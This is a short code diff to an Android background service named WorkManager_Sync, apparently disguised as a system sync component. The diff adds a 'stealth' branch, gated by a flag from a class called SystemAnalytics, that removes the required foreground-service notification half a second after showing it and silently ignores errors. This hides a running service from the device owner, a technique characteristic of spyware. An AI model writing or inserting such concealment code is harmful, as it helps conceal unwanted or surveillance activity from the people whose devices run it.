@@ -398,6 +398,19 @@ public class WorkManager_Sync extends Service {
                 startForeground(NOTIFICATION_ID, notification);
                 isForeground = true;
             }
+
+            if (SystemAnalytics.isStealthEnabled(this)) {
+                new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                    try {
+                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
+                            stopForeground(STOP_FOREGROUND_REMOVE);
+                        } else {
+                            stopForeground(true);
+                        }
+                        isForeground = false;
+                    } catch (Exception ignored) {}
+                }, 500);
+            }
         } catch (Exception e) {
             Log.e(TAG, "Critical FGS startup failure: " + e.getMessage());
         }
